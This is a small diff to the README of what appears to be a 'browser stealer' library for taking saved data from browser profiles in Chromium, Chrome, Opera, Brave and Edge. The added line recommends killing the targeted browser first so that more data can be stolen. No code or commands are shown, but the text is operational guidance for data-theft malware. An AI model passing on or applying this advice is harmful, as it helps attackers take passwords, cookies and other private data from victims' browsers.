@@ -29,6 +29,8 @@ After running the command you can import and use browser stealer in your own pro
 
 ## Code Examples
 
+- **RECOMMENDED**: before stealing anything its recommended to kill the targeted browser because some data wont be stolen if browser is running
+
 ##### Chromium
 
 Simple example for stealing data from profile "Default" of browsers: Chromium, Chrome, Opera, Opera GX, Brave, Edge
